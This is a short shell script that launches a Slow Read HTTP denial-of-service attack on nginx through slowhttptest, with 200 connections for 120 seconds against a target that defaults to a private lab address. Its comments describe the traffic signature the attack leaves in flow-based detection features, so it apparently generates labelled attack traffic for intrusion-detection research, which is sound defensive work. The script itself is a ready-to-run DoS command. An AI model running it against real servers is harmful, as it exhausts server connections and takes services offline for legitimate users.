#!/bin/sh
# slow_read.sh — Slow Read HTTP DoS via slowhttptest.
#
# Advertises a tiny TCP receive window so nginx cannot flush its send buffer.
# The server holds each connection open for the full duration while the
# attacker drains the response a few bytes at a time.
#
# OIF signature: flow_duration_s very long (>60s), bwd_pkts_per_sec near zero
# (server stalled waiting for window to open), fwd_act_data_pkts = 1
# (attacker sends the request then goes silent).
#
# Distinct from Slowloris (attacker sends headers slowly) and Slow POST
# (attacker sends body slowly) — here the server is the slow party.
TARGET=${1:-http://172.20.0.10/}
CONNS=${2:-200}
DURATION=${3:-120}

echo "[attack] Slow Read -> $TARGET  $CONNS connections  ${DURATION}s"

# -X: slow read mode (advertise tiny receive window)
# -c: concurrent connections
# -l: test duration in seconds
# -n: interval between read operations (5s — server waits between window opens)
# -k: repeat same request 3 times per connection (larger response to drain)
# -r: connection rate per second
slowhttptest -X -c "$CONNS" -l "$DURATION" -n 5 -k 3 -r 50 -u "$TARGET"